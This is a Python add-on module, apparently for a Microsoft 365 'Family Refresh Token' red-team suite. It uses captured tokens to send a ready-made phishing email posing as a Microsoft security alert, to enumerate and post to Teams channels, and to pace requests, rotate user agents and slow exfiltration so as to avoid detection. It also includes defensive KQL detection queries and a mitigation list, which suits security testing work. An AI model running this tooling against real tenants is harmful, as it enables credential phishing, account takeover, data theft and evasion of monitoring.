#!/usr/bin/env python3
"""
MÓDULOS ADICIONAIS - Extensões para FRT Red Team Suite
Inclui: Email, Teams, Evasão, KQL, Relatórios Avançados
"""

import json
import requests
from datetime import datetime
from pathlib import Path
from typing import List, Dict

# ============================================================================
# MÓDULO: ENVIAR EMAILS (Phishing)
# ============================================================================

class EmailModule:
    """Módulo para enviar emails como phishing ou comunicação"""
    
    def __init__(self, token_manager):
        self.token_manager = token_manager
        self.graph_endpoint = "https://graph.microsoft.com/v1.0"
    
    def send_email(self, to: str, subject: str, body: str, html: bool = False, 
                   label: str = "primary", save_to_sent: bool = True) -> bool:
        """Envia email"""
        token = self.token_manager.get_token(label)
        if not token:
            print("[-] Token não encontrado")
            return False
        
        headers = {
            "Authorization": f"Bearer {token.access_token}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "message": {
                "subject": subject,
                "body": {
                    "contentType": "HTML" if html else "Text",
                    "content": body
                },
                "toRecipients": [
                    {
                        "emailAddress": {
                            "address": to
                        }
                    }
                ]
            },
            "saveToSentItems": save_to_sent
        }
        
        try:
            response = requests.post(
                f"{self.graph_endpoint}/me/sendMail",
                headers=headers,
                json=payload,
                timeout=10
            )
            
            if response.status_code == 202:
                print(f"[+] ✓ Email enviado para {to}")
                print(f"[+] Assunto: {subject}")
                return True
            else:
                print(f"[-] Erro: {response.status_code}")
                print(f"[-] {response.text[:200]}")
                return False
        
        except Exception as e:
            print(f"[-] Erro: {e}")
            return False
    
    def send_phishing_email(self, to: str, target_name: str = "Usuario", label: str = "primary") -> bool:
        """Envia email de phishing realista"""
        
        html_body = f"""
<html>
<body style="font-family: Calibri, Arial, sans-serif; color: #1f1f1f;">
    <p>Olá {target_name},</p>
    
    <p>Detectamos uma tentativa de acesso não autorizado à sua conta Microsoft 365.</p>
    
    <p><strong>Para proteger sua conta, precisamos que você confirme sua identidade:</strong></p>
    
    <div style="background: #f0f0f0; padding: 15px; margin: 20px 0; border-radius: 5px;">
        <a href="https://seu-site-aqui.com/verify" style="background: #0078d4; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;">
            Confirmar Identidade
        </a>
    </div>
    
    <p>Este link expira em 24 horas.</p>
    
    <p>Se você não iniciou esta solicitação, por favor ignore este email.</p>
    
    <hr style="border: none; border-top: 1px solid #d0d0d0; margin: 30px 0;">
    
    <p style="font-size: 12px; color: #666;">
        Microsoft Security Alert<br>
        Microsoft 365 Security Team<br>
    </p>
</body>
</html>
        """
        
        return self.send_email(
            to=to,
            subject="[ALERTA] Verificação de Segurança Microsoft 365",
            body=html_body,
            html=True,
            label=label
        )

# ============================================================================
# MÓDULO: TEAMS
# ============================================================================

class TeamsModule:
    """Módulo para interagir com Teams"""
    
    def __init__(self, token_manager):
        self.token_manager = token_manager
        self.graph_endpoint = "https://graph.microsoft.com/v1.0"
    
    def list_teams(self, label: str = "primary") -> List[Dict]:
        """Lista Teams do usuário"""
        token = self.token_manager.get_token(label)
        if not token:
            return []
        
        headers = {
            "Authorization": f"Bearer {token.access_token}",
            "Content-Type": "application/json"
        }
        
        print("[*] Enumerando Teams...")
        
        try:
            response = requests.get(
                f"{self.graph_endpoint}/me/joinedTeams",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                teams = response.json().get('value', [])
                
                print(f"\n[+] {len(teams)} Teams encontrados:\n")
                
                for team in teams:
                    name = team.get('displayName')
                    team_id = team.get('id')
                    
                    print(f"  Team: {name}")
                    print(f"  ID: {team_id}\n")
                
                return teams
        except Exception as e:
            print(f"[-] Erro: {e}")
        
        return []
    
    def list_channels(self, team_id: str, label: str = "primary") -> List[Dict]:
        """Lista canais de um team"""
        token = self.token_manager.get_token(label)
        if not token:
            return []
        
        headers = {
            "Authorization": f"Bearer {token.access_token}",
            "Content-Type": "application/json"
        }
        
        print(f"[*] Listando canais do team {team_id}...")
        
        try:
            response = requests.get(
                f"{self.graph_endpoint}/teams/{team_id}/channels",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                channels = response.json().get('value', [])
                
                print(f"\n[+] {len(channels)} canais encontrados:\n")
                
                for channel in channels:
                    name = channel.get('displayName')
                    channel_id = channel.get('id')
                    
                    print(f"  Canal: {name}")
                    print(f"  ID: {channel_id}\n")
                
                return channels
        except Exception as e:
            print(f"[-] Erro: {e}")
        
        return []
    
    def send_message(self, team_id: str, channel_id: str, message: str, label: str = "primary") -> bool:
        """Envia mensagem em um canal"""
        token = self.token_manager.get_token(label)
        if not token:
            return False
        
        headers = {
            "Authorization": f"Bearer {token.access_token}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "body": {
                "contentType": "html",
                "content": message
            }
        }
        
        print(f"[*] Enviando mensagem ao channel {channel_id}...")
        
        try:
            response = requests.post(
                f"{self.graph_endpoint}/teams/{team_id}/channels/{channel_id}/messages",
                headers=headers,
                json=payload,
                timeout=10
            )
            
            if response.status_code == 201:
                print("[+] ✓ Mensagem enviada!")
                return True
            else:
                print(f"[-] Erro: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Erro: {e}")
            return False

# ============================================================================
# MÓDULO: EVASÃO (Anti-Detecção)
# ============================================================================

class EvadeModule:
    """Módulo para evasão de detecção"""
    
    @staticmethod
    def rate_limit_requests(requests_per_minute: int = 30):
        """Simula requisições em velocidade realista"""
        import time
        
        interval = 60 / requests_per_minute
        
        print(f"[*] Rate limiting: {requests_per_minute} req/min")
        print(f"[*] Intervalo entre requisições: {interval:.1f}s")
        
        return interval
    
    @staticmethod
    def randomize_user_agent() -> Dict[str, str]:
        """Usa User-Agent realista"""
        import random
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        ]
        
        ua = random.choice(user_agents)
        
        return {
            "User-Agent": ua,
            "Accept-Language": "pt-BR,pt;q=0.9",
            "Accept-Encoding": "gzip, deflate, br"
        }
    
    @staticmethod
    def slow_exfiltration(data_size_mb: float, duration_hours: float = 24) -> float:
        """Calcula velocidade de exfiltração para passar despercebido"""
        
        bytes_per_second = (data_size_mb * 1024 * 1024) / (duration_hours * 3600)
        kb_per_second = bytes_per_second / 1024
        
        print(f"\n[+] Exfiltração lenta:")
        print(f"    Dados: {data_size_mb}MB")
        print(f"    Duração: {duration_hours}h")
        print(f"    Velocidade: {kb_per_second:.1f}KB/s")
        print(f"    Realista para: Downloads normais\n")
        
        return kb_per_second
    
    @staticmethod
    def business_hours_only(start_hour: int = 8, end_hour: int = 18):
        """Faz requisições apenas em horário comercial"""
        from datetime import datetime
        
        current_hour = datetime.now().hour
        
        if start_hour <= current_hour < end_hour:
            print(f"[+] Dentro do horário comercial ({start_hour}h-{end_hour}h)")
            return True
        else:
            print(f"[-] Fora do horário comercial. Aguardando...")
            return False

# ============================================================================
# MÓDULO: KQL (Detecção)
# ============================================================================

class KQLModule:
    """Módulo com queries de detecção KQL"""
    
    KQL_QUERIES = {
        "device_code_flow": """
CloudAppEvents
| where ActionType == "DeviceCodeRequested"
| where Application in~ ("Microsoft Office", "Azure CLI")
| summarize Count = count() by UserPrincipalName, IPAddress
| where Count > 5
""",
        
        "frt_testing": """
CloudAppEvents
| where ActionType == "AuthorizationAttempted"
| where ClientAppUsed in~ (
    "Microsoft Office",
    "Microsoft Teams", 
    "OneDrive",
    "Outlook Mobile",
    "Office 365 Management"
  )
| summarize 
    UniqueApps = dcount(ClientAppUsed),
    Events = count()
    by UserPrincipalName, IPAddress, bin(TimeGenerated, 5m)
| where UniqueApps >= 3
""",
        
        "token_minting": """
AADTokenIssuedEvents
| where TimeGenerated > ago(1h)
| where ApplicationId in (
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "ab9b8c07-8f02-4f72-87fa-80105867a763",
    "27922004-5251-4030-b22d-91ecd9a37ea4",
    "00b41c95-dab0-4487-9791-b9d2c32c80f2"
  )
| where TokenType == "RefreshToken"
| summarize TokenCount = count() by UserPrincipalName, bin(TimeGenerated, 1m)
| where TokenCount > 10
""",
        
        "email_enum": """
CloudAppEvents
| where ActionType == "Get"
| where ObjectName in ("messages", "mail")
| where TimeGenerated > ago(1h)
| summarize
    EmailsRead = count(),
    UniqueIPs = dcount(IPAddress)
    by UserPrincipalName
| where EmailsRead > 50
""",
        
        "admin_enum": """
CloudAppEvents
| where ActionType == "Get"
| where ObjectName == "directoryRoles"
| where RawEventData contains "Global Administrator"
| where TimeGenerated > ago(1h)
| summarize Events = count() by UserPrincipalName, IPAddress
| where Events > 1
"""
    }
    
    @classmethod
    def export_kql_queries(cls, output_file: str = "kql_queries.txt"):
        """Exporta todas as KQL queries"""
        
        with open(output_file, 'w') as f:
            for name, query in cls.KQL_QUERIES.items():
                f.write(f"\n{'='*80}\n")
                f.write(f"Query: {name.upper()}\n")
                f.write(f"{'='*80}\n\n")
                f.write(query.strip())
                f.write("\n\n")
        
        print(f"[+] Queries exportadas para: {output_file}")
    
    @classmethod
    def get_query(cls, name: str) -> str:
        """Retorna uma query específica"""
        return cls.KQL_QUERIES.get(name, "")

# ============================================================================
# MÓDULO: RELATÓRIOS
# ============================================================================

class ReportModule:
    """Módulo para gerar relatórios detalhados"""
    
    @staticmethod
    def generate_html_report(data_dir: Path, output_file: str = "report.html"):
        """Gera relatório em HTML"""
        
        html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FRT Attack Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #d32f2f; }
        h2 { color: #0078d4; margin-top: 30px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .success { color: green; }
        .error { color: red; }
        .warning { color: orange; }
    </style>
</head>
<body>
    <h1>🔐 FRT Attack - Report</h1>
    <p>Gerado em: {timestamp}</p>
    
    <h2>Resumo Executivo</h2>
    <p>Este relatório documenta a análise de vulnerabilidade Family Refresh Token em um ambiente Azure AD.</p>
    
    <h2>Dados Coletados</h2>
"""
        
        # Adiciona dados dos arquivos JSON
        files_to_check = [
            ("users_enum.json", "Usuários Enumerados"),
            ("admins_enum.json", "Admins Encontrados"),
            ("emails_read.json", "Emails Lidos"),
            ("onedrive_files.json", "Arquivos OneDrive"),
            ("frt_analysis.json", "Análise FRT"),
        ]
        
        for filename, title in files_to_check:
            filepath = data_dir / filename
            
            if filepath.exists():
                html += f"<h3>{title}</h3>\n"
                
                with open(filepath, 'r') as f:
                    data = json.load(f)
                
                if isinstance(data, list):
                    html += f"<p><span class='success'>✓ {len(data)} itens encontrados</span></p>\n"
                elif isinstance(data, dict):
                    html += f"<p><span class='success'>✓ Dados capturados</span></p>\n"
        
        html += """
    <h2>Recomendações</h2>
    <ol>
        <li>Bloquear Device Code Flow via Conditional Access</li>
        <li>Implementar MFA obrigatório para todos os usuários</li>
        <li>Habilitar monitoramento com KQL queries</li>
        <li>Revogar todos os Refresh Tokens do usuário comprometido</li>
        <li>Implementar Zero Trust Architecture</li>
    </ol>
    
    <footer>
        <p style="color: #999; font-size: 12px;">
            Relatório preparado por FRT Red Team Suite<br>
            Use com responsabilidade e sempre com autorização
        </p>
    </footer>
</body>
</html>
        """
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html.format(timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        
        print(f"[+] Relatório HTML gerado: {output_file}")
    
    @staticmethod
    def generate_json_report(data_dir: Path) -> Dict:
        """Gera relatório estruturado em JSON"""
        
        report = {
            "timestamp": datetime.utcnow().isoformat(),
            "summary": {
                "status": "Attack Simulation Complete",
                "severity": "CRITICAL (CVSS 9.8)",
                "duration_days": 90
            },
            "phases": {
                "phase_1": "Token Capture (Device Code Flow)",
                "phase_2": "FRT Analysis (Testing)",
                "phase_3": "Exploitation (Lateral Movement)",
                "phase_4": "Persistence (Renewal)",
                "phase_5": "Escalation (Admin Compromise)"
            },
            "data_collected": {}
        }
        
        # Adiciona dados dos arquivos
        files_to_check = [
            "users_enum.json",
            "admins_enum.json",
            "emails_read.json",
            "onedrive_files.json",
            "frt_analysis.json"
        ]
        
        for filename in files_to_check:
            filepath = data_dir / filename
            
            if filepath.exists():
                with open(filepath, 'r') as f:
                    report["data_collected"][filename] = json.load(f)
        
        return report

# ============================================================================
# INTEGRAÇÃO COM MENU PRINCIPAL
# ============================================================================

def extend_menu():
    """Função para estender o menu principal com novos módulos"""
    
    return {
        "EMAIL": EmailModule,
        "TEAMS": TeamsModule,
        "EVADE": EvadeModule,
        "KQL": KQLModule,
        "REPORTS": ReportModule,
    }

if __name__ == "__main__":
    print("[*] Módulos adicionais carregados com sucesso")
    print("[*] Use-os importando em frt_red_team_suite.py")
